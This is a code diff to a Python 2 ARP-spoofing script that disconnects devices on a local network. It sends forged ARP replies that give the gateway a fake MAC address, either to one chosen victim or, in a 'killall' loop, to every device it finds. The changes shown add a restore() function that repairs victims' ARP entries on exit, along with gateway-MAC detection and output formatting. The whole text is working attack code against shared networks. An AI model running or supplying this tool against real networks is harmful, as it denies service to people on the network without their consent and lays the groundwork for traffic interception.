@@ -33,6 +33,12 @@ def poison(victim_ip, victim_mac, gateway_ip):
   packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
   send(packet, verbose=0)
 
+def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
+  # Send the victim an ARP packet pairing the gateway ip with the correct
+  # mac address
+  packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
+  send(packet, verbose=0)
+
 def get_lan_ip():
   # A hacky method to get the current lan ip address. It requires internet
   # access, but it works
@@ -42,6 +48,9 @@ def get_lan_ip():
   s.close()
   return ip[0]
 
+def printdiv():
+  print '--------------------'
+
 # Check for root
 if os.geteuid() != 0:
   print "You need to run the script as a superuser"
@@ -49,6 +58,7 @@ if os.geteuid() != 0:
 
 # Search for stuff every time we refresh
 refreshing = True
+gateway_mac = '12:34:56:78:9A:BC' # A default (bad) gateway mac address
 while refreshing:
   # Use the current ip XXX.XXX.XXX.XXX and get a string in
   # the form "XXX.XXX.XXX.*" and "XXX.XXX.XXX.1". Right now,
@@ -64,11 +74,23 @@ while refreshing:
 
   # Get a list of devices and print them to the screen
   devices = get_ip_macs(ip_range)
+  printdiv()
   print "Connected ips:"
   i = 0
   for device in devices:
     print '%s)\t%s\t%s' % (i, device[0], device[1])
+    # See if we have the gateway MAC
+    if device[0] == gateway_ip:
+      gateway_mac = device[1]
     i+=1
+
+  printdiv()
+  print 'Gateway ip:  %s' % gateway_ip
+  if gateway_mac != '12:34:56:78:9A:BC':
+    print "Gateway mac: %s" % gateway_mac
+  else:
+    print 'Gateway not found. Script will be UNABLE TO RESTORE WIFI once shutdown is over'
+  printdiv()
   
   # Get a choice and keep prompting until we get a valid letter or a number
   # that is in range
@@ -111,6 +133,7 @@ if choice.isdigit():
     while True:
       poison(victim[0], victim[1], gateway_ip)
   except KeyboardInterrupt:
+      restore(victim[0], victim[1], gateway_ip, gateway_mac)
       print '\nYou\'re welcome!'
 elif killall:
   # If we are going to kill everything, loop the poison function until we
@@ -120,5 +143,7 @@ elif killall:
       for victim in devices:
         poison(victim[0], victim[1], gateway_ip)
   except KeyboardInterrupt:
+    for victim in devices:
+      restore(victim[0], victim[1], gateway_ip, gateway_mac)
     print '\nYou\'re welcome!'
     
